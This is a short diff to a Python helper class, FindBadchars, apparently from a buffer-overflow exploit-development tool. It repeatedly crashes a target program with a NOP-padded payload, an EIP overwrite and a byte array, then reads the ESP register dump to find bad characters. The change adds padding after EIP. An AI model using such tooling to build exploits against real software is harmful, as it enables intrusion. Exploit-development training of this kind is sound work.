@@ -21,7 +21,6 @@ class FindBadchars:
     "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
     "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
     )
-    #“\x00\x07\x2e\xa0”
 
     def __init__(self, prefix, offset, eip, program, ip, port, timeout = 5):
         self.prefix = prefix
@@ -36,14 +35,13 @@ class FindBadchars:
         self.remaining_badchars = self.badchars
         self.checked_all = False
 
-    def find_badchars(self):
+    def find_badchars(self, offset_after_eip):
         print("... Founding bad chars!")
         self.program.restart()
         
         threading.Thread(target=self.program.run_program()).start()
         threading.Thread(target=self.program.exploit(self.prefix, self.offset*"\x90", 
-                                                        self.eip, self.remaining_badchars, "", "")).start()
-
+                                                        self.eip, offset_after_eip*"\x90", self.remaining_badchars, "")).start()
         self.dumped_array = self.program.get_register_dump("esp").split(" ")
         while not self.checked_all:
             for char in self.badchars:
@@ -53,7 +51,7 @@ class FindBadchars:
                     self.program.restart()
                     threading.Thread(target=self.program.run_program()).start()
                     threading.Thread(target=self.program.exploit(self.prefix, self.offset*"\x90", 
-                                                                 self.eip, self.remaining_badchars, "", "")).start()
+                                                                 self.eip, offset_after_eip*"\x90", self.remaining_badchars, "")).start()
                     self.dumped_array = self.program.get_register_dump("esp").split(" ")
 
         return self.founded_badchars
